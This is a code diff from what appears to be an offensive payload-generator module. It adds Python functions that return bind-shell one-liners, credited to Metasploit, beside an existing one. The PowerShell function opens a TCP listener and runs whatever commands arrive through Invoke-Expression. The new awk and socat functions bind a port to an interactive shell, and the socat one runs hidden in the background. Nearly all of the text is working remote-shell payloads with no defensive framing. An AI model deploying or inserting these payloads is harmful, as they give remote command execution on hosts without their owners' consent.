@@ -37,3 +37,13 @@ def BIND_NETCAT_OPENBSD_UDP():
 
 def BIND_POWERSHELL_TCP():
 	return """powershell.exe -nop -ep bypass -Command '$port=PORT;$listener=[System.Net.Sockets.TcpListener]$port;$listener.Start();$client = $listener.AcceptTCPClient();$stream=$client.GetStream();[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes(\\"Windows PowerShell running as user \\" + $env:username + \\" on \\" + $env:computername + \\"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\\");$stream.Write($sendbytes,0,$sendbytes.Length);$sendbytes = ([text.encoding]::ASCII).GetBytes(\\"PS \\" + (Get-Location).Path + \\"> \\");$stream.Write($sendbytes,0,$sendbytes.Length);while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $returndata = ([text.encoding]::ASCII).GetString($bytes, 0, $i); try { $result = (Invoke-Expression -command $returndata 2>&1 | Out-String ) } catch { Write-Warning \\"Something went wrong with execution of command on the target.\\"; Write-Error $_; }; $sendback = $result +  \\"PS \\" + (Get-Location).Path + \\"> \\"; $x = ($error[0] | Out-String); $error.clear(); $sendback = $sendback + $x; $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbytes, 0, $sendbytes.Length); $stream.Flush();}; $client.Close(); if ($listener) { $listener.Stop(); };'"""
+
+# Removed from MetasploitFramework
+# https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/cmd/unix/bind_awk.rb
+def BIND_AWK_TCP():
+        return "awk 'BEGIN{s=\"/inet/tcp/PORT/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
+
+# Removed from MetasploitFramework
+# https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/cmd/unix/bind_socat_udp.rb
+def BIND_SOCAT_UDP():
+        return "socat udp-listen:PORT exec:'bash -li',pty,stderr,sane 2>&1>/dev/null &"
